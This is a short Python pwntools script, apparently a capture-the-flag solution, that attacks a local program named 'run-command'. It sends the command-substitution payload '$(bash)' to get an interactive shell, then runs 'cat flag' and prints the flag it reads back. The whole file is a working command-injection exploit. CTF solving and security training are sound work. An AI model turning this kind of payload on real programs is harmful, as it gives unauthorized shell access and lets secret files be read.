
from pwn import *
import os

proc = process('./run-command')

# bash comands
proc.sendline(b'$(bash)')
proc.sendline(b'cat flag')
proc.sendline(b'exit')

# output flag
proc.recvuntil(b'\'')
print(proc.recvuntil(b'}'))
